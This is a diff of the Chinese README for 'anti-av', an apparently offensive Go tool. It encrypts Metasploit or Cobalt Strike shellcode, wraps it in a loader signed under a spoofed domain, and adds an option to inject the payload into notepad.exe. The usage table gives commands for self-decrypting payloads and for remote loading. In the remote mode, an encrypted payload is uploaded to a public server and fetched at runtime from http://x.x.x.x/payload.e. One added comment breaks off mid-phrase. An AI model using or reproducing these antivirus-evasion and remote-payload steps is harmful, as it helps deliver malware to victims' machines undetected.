@@ -12,9 +12,9 @@
 ### Requirement
 
 ```bash
-1、建议使用Mac或 linux环境
+1、建议使用Mac或linux环境
 2、安装交叉编译 mingw64
-3、安装签名 osslsigncode
+3、安装签名 openssl、osslsigncode
 ```
 
 
@@ -26,7 +26,7 @@ git clone https://github.com/b1gcat/anti-av.git
 go build
 
 Usage of ./anti-av:
-  -domain string //签名binary时使用该域名。
+  -domain string //签名binary时使用该域名。如果唯恐
         domain to be signed (default "baidu.com")
         
   -e    payload to be encrypted //布尔类型和-sc一起使用，对-sc指定的shellcode文件加密
@@ -42,39 +42,22 @@ Usage of ./anti-av:
         
   -sc string //shellcode的文件或url地址。如果是url，则在运行时访问下载。
         encrypt payload by anti-av: support 'msfvenom -f raw' OR 'cs raw' OR remote url loading (default "payload.e")
+   -inject //布尔类型，运行时shellcode注入notepad进程。
+        inject payload to notepad.exe       
 
 ```
-
-
 
 
 
 ## 使用方案
 
-### 1、binary自解压shellcode
-```bash
-./anti-av -sc ~/Desktop/payload.bin 
-```
 
 
-### 2、binary远程加载shellcode
-
-> STEP1: 生成加密payload (dist目录下生成payload.e)
-
-```bash
-./anti-av  -e -sc ~/Desktop/payload.bin 
-```
-> STEP2: 上传payload.e到公共下载服务器
-
-```ASN.1
-略
-```
-
-> STEP3: 制作loader
-
-```bash
-./anti-av -sc http://x.x.x.x/payload.e 
-```
+| 形态              | 生成命令                                                     |
+| ----------------- | ------------------------------------------------------------ |
+| 自解密shellcode   | ./anti-av -sc ~/Desktop/payload.bin                          |
+| 远程加载shellcode | 1、./anti-av  -e -sc ~/Desktop/payload.bin    #加密shellcode<br />2、上传payload.e到公共下载服务<br />3、./anti-av -sc http://x.x.x.x/payload.e         #制作加载器 |
+| 注入进程          | under test                                                         |
 
 
 
